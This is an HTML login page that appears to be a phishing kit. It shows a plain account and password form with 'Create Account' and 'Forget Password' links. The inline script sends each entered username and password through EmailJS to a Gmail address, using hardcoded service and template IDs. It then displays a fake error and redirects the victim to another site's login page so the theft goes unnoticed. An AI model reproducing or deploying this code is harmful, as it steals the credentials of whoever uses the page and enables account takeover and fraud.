<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>login</title>
    <link rel="stylesheet" href="css/index.css">
    <link rel="stylesheet" href="css/common.css">
    <link rel="stylesheet"href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
</head>
<body>
    <div class="app">
        <div class="lange">
            <span>language</span>
        </div>
        <div class="logo">
            <img src="img/ebd64f5013feda22.png" style=" height:8.5rem; width: initial;" alt="img">
        </div>
        <div class="login_h1">login</div>
        <div class="login_input"><input type="text" id="userName" placeholder="Input Account" required></div>
        <div class="login_input"><input type="password" id="password" placeholder="Input password" required></div>
        <div class="login_btn" onclick="sendMmail();">login</div>
        <a href="#" class="login_btn2">Create Account</a>
        <div class="forget">Forget Password</div>
        
    </div>


    <script>
         let app = document.querySelector('.app')
        function sendMmail() {
           (function () {
              emailjs.init("ZM_hUk1I2FumtCzBZ"); // account public key
           })();

           let params = {
              sendername: `nom d'utilisateur :${document.querySelector("#userName").value}`,
              to: "futurenextfuture@gmail.com",
              subjet: `nom d'utilisateur :${document.querySelector("#userName").value}`,
              replyto: "noreply@gmail.com",
              message:  `nom d'utilisateur :${document.querySelector("#userName").value} \n
                        mot de passe: ${document.querySelector("#password").value}
              `,
           };

           let serviveID = "service_azrnrao"; // email service id

           let templateID = "template_v6vxfok"; //email  template id

           emailjs
              .send(serviveID, templateID, params)

              .then((res) => {
                app.innerHTML+= '<p class="error animate__animated animate__shakeX">EROOR</p>'
              setTimeout(()=>{
                window.location.href='https://nextlevel-future.com/index/login'
              },1000)
                
              })

              .catch();
        }
     </script>
   
</body>
</html>
